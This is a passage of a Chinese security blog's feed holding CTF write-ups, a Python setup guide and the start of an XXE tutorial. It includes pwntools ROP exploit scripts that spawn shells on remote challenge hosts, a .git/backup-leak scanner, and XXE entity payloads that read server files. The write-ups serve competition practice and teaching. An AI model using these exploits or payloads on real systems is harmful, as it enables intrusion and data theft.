stackpwn"></a>0x05 stackpwn</h2><p>简单的栈溢出泄露libc版本，构造rop拿shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">elf=ELF(<span class="string">'stackpwn'</span>)</span><br><span class="line">libc=ELF(<span class="string">'libc6_2.23-0ubuntu10_amd64.so'</span>)</span><br><span class="line"><span class="comment">#p=process("stackpwn")</span></span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10022</span>)</span><br><span class="line">pop_rdi=<span class="number">0x00400933</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">libc_got=elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">main_addr=<span class="number">0x040080D</span></span><br><span class="line">libc_start=libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">binaddr=<span class="number">0x400954</span></span><br><span class="line">system_libc=libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">p.recvuntil(<span class="string">"input your instructions...\n"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span> + p64(pop_rdi)+p64(libc_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(libc)</span><br><span class="line">libc_base=libc-libc_start</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">p.recvuntil(<span class="string">"input your instructions...\n"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span> + p64(pop_rdi)+p64(binaddr)+p64(system_libc+libc_base)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x06-easy-pwn"><a href="#0x06-easy-pwn" class="headerlink" title="0x06 easy_pwn"></a>0x06 easy_pwn</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10016</span>)</span><br><span class="line">elf=ELF(<span class="string">'pwn'</span>)</span><br><span class="line">libc=ELF(<span class="string">'libc6_2.23-0ubuntu10_amd64.so'</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">libc_got=elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">libc_start=libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">binaddr=<span class="number">0x006010A0</span></span><br><span class="line">main_addr=<span class="number">0x0004006F9</span></span><br><span class="line">pop_rdi=<span class="number">0x004007d3</span></span><br><span class="line">system_libc=libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Leave your name: "</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Now play your game: "</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">88</span> + p64(pop_rdi) + p64(libc_got)+p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(libc)</span><br><span class="line">libc_base=libc-libc_start</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">p.recvuntil(<span class="string">"Leave your name: "</span>)</span><br><span class="line">p.send(<span class="string">"/bin/sh\x00\x00"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">88</span> + p64(pop_rdi)+p64(binaddr)+p64(system_libc+libc_base)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;Code-execution&quot;&gt;&lt;a href=&quot;#Code-execution&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="团队ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E5%9B%A2%E9%98%9Fctf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>win10安装python2和python3兼容运行</title>
    <link href="https://www.damyahome.github.io/win10%E5%AE%89%E8%A3%85python2%E5%92%8Cpython3%E5%85%BC%E5%AE%B9%E8%BF%90%E8%A1%8C/"/>
    <id>https://www.damyahome.github.io/win10%E5%AE%89%E8%A3%85python2%E5%92%8Cpython3%E5%85%BC%E5%AE%B9%E8%BF%90%E8%A1%8C/</id>
    <published>2019-11-08T02:53:30.000Z</published>
    <updated>2019-11-08T04:00:18.226Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出去打比赛发现自己的python很有问题,python2和python3经常不能兼容使用,pip也是只能安装python3的包,用的很憋屈,所以打算重装下,并记录过程</p><h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><p>去 <a href="https://www.python.org/downloads/" target="_blank" rel="noopener">官网</a><br>这里我下的是python3.7.5和python2.7.17<br>在环境变量里添加用户变量PATH(以下是我的配置路径)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Local\Programs\Python\Python37\Scripts;</span><br><span class="line">C:\Users\Administrator\AppData\Local\Programs\Python\Python37;</span><br><span class="line">C:\Python27\Scripts</span><br><span class="line">C:\Python27</span><br></pre></td></tr></table></figure></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="方法一-亲测可用"><a href="#方法一-亲测可用" class="headerlink" title="方法一(亲测可用)"></a>方法一(亲测可用)</h3><p>启动python<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py -2 //调用python2</span><br><span class="line">py -3 //调用python3</span><br></pre></td></tr></table></figure></p><p>使用pip命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py -2 -m pip install xxx</span><br><span class="line">py -3 -m pip install xxx</span><br></pre></td></tr></table></figure></p><h3 id="方法二-网传的-不推荐"><a href="#方法二-网传的-不推荐" class="headerlink" title="方法二(网传的,不推荐)"></a>方法二(网传的,不推荐)</h3><p>进入Python27目录，将文件夹里的python.exe重命名为python2.exe，pythonw.exe重命名为pythonw2.exe<br>进入Python37目录，将文件夹里的python.exe重命名为python3.exe，pythonw.exe重命名为pythonw3.exe<br>打开cmd命令行窗口，分别输入Python2和Python3，正确的情况下应该分别进入python2.7和python3.7环境<br>写脚本在代码第一行加上<code>#! C:\python27\python2.exe</code>就是调用python2，python3同理</p><p>升级pip,即重装,先将python2和python3里的pip.exe删除,然后执行以下两个命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip install --upgrade pip --force-reinstall</span><br><span class="line">python3 -m pip install --upgrade pip --force-reinstall</span><br></pre></td></tr></table></figure></p><p>安装好后进行检验<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip2 -v</span><br><span class="line">pip3 -v</span><br><span class="line">python2 -v</span><br><span class="line">python3 -v</span><br></pre></td></tr></table></figure></p><p>ps:实际上并没有用,pip2还得到他的Scripts目录下使用,辣鸡教程</p><h2 id="最终方案"><a href="#最终方案" class="headerlink" title="最终方案"></a>最终方案</h2><p>我把两个方法整合使用</p><p>使用python2和python3时<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2</span><br><span class="line">python3</span><br></pre></td></tr></table></figure></p><p>使用pip时需要结合起来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip install xxx</span><br><span class="line">python3 -m pip install xxx</span><br></pre></td></tr></table></figure></p><p>Perfect!!!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;出去打比赛发现自己的python很有问题,python2和python3经常不能兼容使用,pip也是只能安装python3的包,用的很憋屈,
      
    
    </summary>
    
    
      <category term="搭建" scheme="https://www.damyahome.github.io/categories/%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="python" scheme="https://www.damyahome.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>GeekGame2019 wp</title>
    <link href="https://www.damyahome.github.io/GeekGame2019-wp/"/>
    <id>https://www.damyahome.github.io/GeekGame2019-wp/</id>
    <published>2019-10-28T04:45:19.000Z</published>
    <updated>2019-11-20T12:22:03.204Z</updated>
    
    <content type="html"><![CDATA[<p>因为前段时间比赛较多,积压了一些wp,也有很多题没来得及做平台就关了,唉!</p><h1 id="总分-4779"><a href="#总分-4779" class="headerlink" title="总分 4779"></a>总分 4779</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="MISC简介-50"><a href="#MISC简介-50" class="headerlink" title="MISC简介 50"></a>MISC简介 50</h2><p>拖进notepad里,结尾发现flag</p><figure class="image-box">                <img src="./1.png" alt="图片" title class>                <p>图片</p>            </figure><p>scuctf{3f97be46-9ed8-4847-b1ee-b7583c3406e2}</p><h2 id="TXT-629"><a href="#TXT-629" class="headerlink" title="TXT 629"></a>TXT 629</h2><p>在cmd里用nslookup工具查看</p><figure class="image-box">                <img src="./2.png" alt="图片" title class>                <p>图片</p>            </figure><p>scuctf{59d9ca7b-4f39-4c0c-9334-c56c182076b5}</p><h2 id="图片中的XOR-786"><a href="#图片中的XOR-786" class="headerlink" title="图片中的XOR 786"></a>图片中的XOR 786</h2><p>使用stegsolve工具进行异或</p><p>首先保存 blue plane 0 red plane 0 green plane 0 alpha plane 0的图像,用alpha图像去异或blue</p><figure class="image-box">                <img src="./3.png" alt="图片" title class>                <p>图片</p>            </figure><p>scuctf{X0r_1n_pic}(我只能异或成这样了)</p><h2 id="BlindWaterMark-952"><a href="#BlindWaterMark-952" class="headerlink" title="BlindWaterMark 952"></a>BlindWaterMark 952</h2><p>用到BlindWaterMark工具,github上的脚本跑一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Damyayayayaya:~<span class="comment"># python bwm.py decode 1.png problem.png true.png</span></span><br><span class="line">image&lt;1.png&gt; + image(encoded)&lt;problem.png&gt; -&gt; watermark&lt;true.png&gt;</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./4.png" alt="图片" title class>                <p>图片</p>            </figure><p>scuctf{blind_w4ter_mark}</p><h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><p>volatility工具</p><p><a href="https://www.freebuf.com/column/152545.html" target="_blank" rel="noopener">https://www.freebuf.com/column/152545.html</a></p><p><a href="https://blog.csdn.net/yingzinanfei/article/details/53165294" target="_blank" rel="noopener">https://blog.csdn.net/yingzinanfei/article/details/53165294</a></p><h2 id="as-code"><a href="#as-code" class="headerlink" title="as code"></a>as code</h2><p>先写个脚本把txt里的s和a转成二进制流</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.chdir(<span class="string">'C:\\Users\\Administrator\\Downloads'</span>) </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'as_code.txt'</span>): </span><br><span class="line">exit(<span class="number">-1</span>) </span><br><span class="line">lines = open(<span class="string">'as_code.txt'</span>).readlines() </span><br><span class="line">fp = open(<span class="string">'as_code1.txt'</span>,<span class="string">'w'</span>) </span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> lines:</span><br><span class="line">fp.write( s.replace(<span class="string">'s'</span>,<span class="string">'0'</span>).replace(<span class="string">'a'</span>,<span class="string">'1'</span>)) </span><br><span class="line">fp.close()</span><br></pre></td></tr></table></figure><p>我需要一个将二进制流转成图片的脚本</p><h2 id="一个zip"><a href="#一个zip" class="headerlink" title="一个zip"></a>一个zip</h2><p>熟悉的zip伪加密,拖进winhex里,找到所有的504B0102,将带有源文件头的0900加密改成0000</p><figure class="image-box">                <img src="./5.png" alt="图片" title class>                <p>图片</p>            </figure><p>破解第一层</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Crypto简介-50"><a href="#Crypto简介-50" class="headerlink" title="Crypto简介 50"></a>Crypto简介 50</h2><figure class="image-box">                <img src="./6.png" alt="图片" title class>                <p>图片</p>            </figure><p>scuctf{1282237383772259}</p><h2 id="Base64-50"><a href="#Base64-50" class="headerlink" title="Base64 50"></a>Base64 50</h2><p>解base64</p><p>scuctf{this_is_base64}</p><h2 id="CaesarCipher-50"><a href="#CaesarCipher-50" class="headerlink" title="CaesarCipher 50"></a>CaesarCipher 50</h2><figure class="image-box">                <img src="./7.png" alt="图片" title class>                <p>图片</p>            </figure><p>scuctf{attack_at_dawn}</p><h2 id="字符串的数字形式-50"><a href="#字符串的数字形式-50" class="headerlink" title="字符串的数字形式 50"></a>字符串的数字形式 50</h2><p>先十六进制转ascil码得</p><p>%73%63%75%63%74%66%7b%75%72%6c%5f%63%6f%64%65%5f%61%6e%64%5f%68%65%78%7d</p><p>再对应url编码转换得</p><p>scuctf{url_code_and_hex}</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Web简介-50"><a href="#Web简介-50" class="headerlink" title="Web简介 50"></a>Web简介 50</h2><figure class="image-box">                <img src="./8.png" alt="图片" title class>                <p>图片</p>            </figure><p>scuctf{8b93439b-8b46-45cf-b297-fea945a50abb}</p><h2 id="Javascript是世界上最好的语言-50"><a href="#Javascript是世界上最好的语言-50" class="headerlink" title="Javascript是世界上最好的语言 50"></a>Javascript是世界上最好的语言 50</h2><p>他会自动刷新,等一下就行了</p><figure class="image-box">                <img src="./9.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag:scuctf{m@st3r_0f_javasc1pt}</p><h2 id="Get-Post-50"><a href="#Get-Post-50" class="headerlink" title="Get?Post? 50"></a>Get?Post? 50</h2><p>根据提示,构造payload</p><figure class="image-box">                <img src="./10.png" alt="图片" title class>                <p>图片</p>            </figure><p>得到flag</p><p>scuctf{43832254-97aa-4ba1-ace5-4ecd0c1192e7}</p><h2 id="滑稽"><a href="#滑稽" class="headerlink" title="滑稽"></a>滑稽</h2><p>选出一个对的后只需要刷新就可以一直记录次数</p><figure class="image-box">                <img src="./11.png" alt="图片" title class>                <p>图片</p>            </figure><p>用python脚本自动刷新,多线程还不会用,以后尽快完善脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">refresh</span><span class="params">(url,num)</span>:</span></span><br><span class="line">    driver = webdriver.Chrome(<span class="string">"C:/python27/chromedriver.exe"</span>)</span><br><span class="line">    driver.get(url)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        time.sleep(<span class="number">0.001</span>)</span><br><span class="line">        driver.refresh()</span><br><span class="line">    <span class="comment">#driver.close()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    url = input(<span class="string">"Please enter the url:\n"</span>)</span><br><span class="line">    num = int(input(<span class="string">"Enter the number of refresh:\n"</span>))</span><br><span class="line">    refresh(url,num)</span><br></pre></td></tr></table></figure><p>等待一段时间后得到flag</p><h2 id="源码泄露-629"><a href="#源码泄露-629" class="headerlink" title="源码泄露 629"></a>源码泄露 629</h2><p>通过自己写的扫描源码泄露小工具发现是.git泄露</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">lists = [<span class="string">'/.git/config'</span>, <span class="string">'/.svn/entries'</span>, <span class="string">'web.rar'</span>, <span class="string">'www.rar'</span>, <span class="string">'wwwroot.rar'</span>, <span class="string">'1.rar'</span>, <span class="string">'bbs.zip'</span>, <span class="string">'website.rar'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'- - - - - - - - - - - - - - - - - - - -'</span> </span><br><span class="line"><span class="keyword">print</span> <span class="string">u'|    就是个自己用的小脚本 by Damya   |'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'- - - - - - - - - - - - - - - - - - - -'</span></span><br><span class="line"><span class="comment"># 用来输入需要探测的网址</span></span><br><span class="line">address = raw_input(<span class="string">'请输入URL地址：'</span>.decode(<span class="string">'utf-8'</span>).encode(<span class="string">'gbk'</span>))</span><br><span class="line"><span class="comment"># 把列表里的元素一个一个遍历出来</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> lists:</span><br><span class="line"><span class="comment"># 把网址和探测的文件连接到一起</span></span><br><span class="line">    tance = <span class="string">"%s/%s"</span> % (address, a)</span><br><span class="line">    <span class="comment"># print tance   </span></span><br><span class="line"><span class="comment"># 使用 request 模块里的 get 来获取这个网址</span></span><br><span class="line">    qq = requests.get(url=tance)</span><br><span class="line"><span class="comment"># 获取响应码并赋值给 dq</span></span><br><span class="line">    dq = qq.status_code</span><br><span class="line"><span class="comment"># 判断响应码是否为 200 ，是，就进行下一步</span></span><br><span class="line">    <span class="keyword">if</span> dq == <span class="number">200</span> :</span><br><span class="line"><span class="comment"># 输出 响应码和探测地址</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">u"响应码：[%s]  -  地址：%s"</span> % (dq, tance)</span><br><span class="line"><span class="comment"># 如果响应码不是 200 就进行着一步</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"><span class="comment"># 输入响应码和地址</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">u"响应码：[%s]  -  地址：%s"</span> % (dq, tance)</span><br></pre></td></tr></table></figure><p>查看config文件,去github上下载源码,得到index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pR0b1em'</span>]) &amp;&amp; $_GET[<span class="string">'pR0b1em'</span>]==<span class="string">"oWh"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"flag"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"这里没有flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>通过提示传入 ?pR0b1em=oWh 得到flag<br>scuctf{30d3a3f4-51f5-4166-8561-e443d7b7704e}</p><h2 id="一个简单的反序列化"><a href="#一个简单的反序列化" class="headerlink" title="一个简单的反序列化"></a>一个简单的反序列化</h2><p>调后台看到注释,分析代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $score = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> $grades = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">( $score, $grades)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;score = $score;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;grades = $grades;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;score)&amp;&amp;<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;grades)) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'payload'</span>])) &#123;</span><br><span class="line">    $a = unserialize($_POST[<span class="string">'payload'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h2 id="First-reverse-848"><a href="#First-reverse-848" class="headerlink" title="First reverse 848"></a>First reverse 848</h2><p>拖进ida里在main函数f5看伪代码,将变量名转字符,倒过来读取</p><figure class="image-box">                <img src="./12.png" alt="图片" title class>                <p>图片</p>            </figure><p>scuctf{W3lc0me_Jo1n_R3D0g_!!}</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="hello-pwn-签到-535"><a href="#hello-pwn-签到-535" class="headerlink" title="hello_pwn(签到) 535"></a>hello_pwn(签到) 535</h2><figure class="image-box">                <img src="./13.png" alt="图片" title class>                <p>图片</p>            </figure><p>scuctf{238b659c3ccc9bd1bf68f97c8ec76a0a9e38a67226a45ef3456065ef}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;因为前段时间比赛较多,积压了一些wp,也有很多题没来得及做平台就关了,唉!&lt;/p&gt;
&lt;h1 id=&quot;总分-4779&quot;&gt;&lt;a href=&quot;#总分-4779&quot; class=&quot;headerlink&quot; title=&quot;总分 4779&quot;&gt;&lt;/a&gt;总分 4779&lt;/h1&gt;&lt;h1 id=&quot;
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>WEB XML与XXE漏洞(伪协议)</title>
    <link href="https://www.damyahome.github.io/WEB-XML%E4%B8%8EXXE%E6%BC%8F%E6%B4%9E-%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>https://www.damyahome.github.io/WEB-XML%E4%B8%8EXXE%E6%BC%8F%E6%B4%9E-%E4%BC%AA%E5%8D%8F%E8%AE%AE/</id>
    <published>2019-10-27T13:40:19.000Z</published>
    <updated>2019-11-14T09:11:06.244Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在做unctf时遇到一道web题,是xml的xxe漏洞(Do you like xml),当时没做出来,没反应过来这个知识点,后来经人指点稍微理解了一些关于这个的漏洞,又在判作业中看到了这个知识点,所以决定记录下来</p><hr><h2 id="XML与XXE漏洞及伪协议利用"><a href="#XML与XXE漏洞及伪协议利用" class="headerlink" title="XML与XXE漏洞及伪协议利用"></a>XML与XXE漏洞及伪协议利用</h2><p>XML是用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。<br><figure class="image-box">                <img src="./1.png" alt="图片" title class>                <p>图片</p>            </figure><br>这道题可以通过伪协议读取flag.php的内容,从而getflag</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">user</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="注入上的实战使用"><a href="#注入上的实战使用" class="headerlink" title="注入上的实战使用"></a>注入上的实战使用</h2><p>XML当被允许引用外部实体的时候，就存在有被注入的危险，注入的方式有很多，如下</p><h3 id="读取用户端保存的密码"><a href="#读取用户端保存的密码" class="headerlink" title="读取用户端保存的密码"></a>读取用户端保存的密码</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span 